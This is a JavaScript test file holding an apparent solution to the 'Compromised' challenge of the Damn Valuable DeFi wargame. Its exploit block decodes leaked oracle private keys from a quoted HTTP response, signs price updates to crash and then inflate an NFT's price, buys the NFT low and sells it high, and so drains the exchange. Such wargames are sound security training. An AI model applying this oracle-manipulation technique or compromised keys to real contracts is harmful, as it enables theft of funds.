const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        /*
          HTTP/2 200 OK
          content-type: text/html
          content-language: en
          vary: Accept-Encoding
          server: cloudflare

          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
        */

        let source1PrivKeyString = 'c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
        let source2PrivKeyString = '208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        /* Set small price */
        let data = web3.eth.abi.encodeFunctionCall({
            name: 'postPrice',
            type: 'function',
            inputs: [{
                type: 'string',
                name: 'symbol'
            },{
                type: 'uint256',
                name: 'newPrice'
            }]
        }, ["DVNFT", ether('1').toString()]);

        let tx = {
            to: this.oracle.address,
            gas: 3e6,
            nonce: 0,
            data: data 
        }
        web3.eth.accounts.signTransaction(tx,source1PrivKeyString).then(signed=> {
            web3.eth.sendSignedTransaction(signed.rawTransaction);
        });
        web3.eth.accounts.signTransaction(tx,source2PrivKeyString).then(signed=> {
            web3.eth.sendSignedTransaction(signed.rawTransaction);
        });

        /* Buy one */
        await this.exchange.buyOne({from: attacker, value: ether('1')});

        /* Set high price */
        let highPrice = ether('10001');

        data = web3.eth.abi.encodeFunctionCall({
            name: 'postPrice',
            type: 'function',
            inputs: [{
                type: 'string',
                name: 'symbol'
            },{
                type: 'uint256',
                name: 'newPrice'
            }]
        }, ["DVNFT", highPrice.toString()]);

        tx = {
            to: this.oracle.address,
            gas: 3e6,
            nonce: 1,
            data: data 
        }
        web3.eth.accounts.signTransaction(tx,source1PrivKeyString).then(signed=> {
            web3.eth.sendSignedTransaction(signed.rawTransaction);
        });
        web3.eth.accounts.signTransaction(tx,source2PrivKeyString).then(signed=> {
            web3.eth.sendSignedTransaction(signed.rawTransaction);
        });

        /* Approve exchange to buy */
        await this.token.approve(this.exchange.address, 1, {from: attacker});
        
        /* Sell one to exchange */
        await this.exchange.sellOne(1, {from: attacker});
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
    });
});
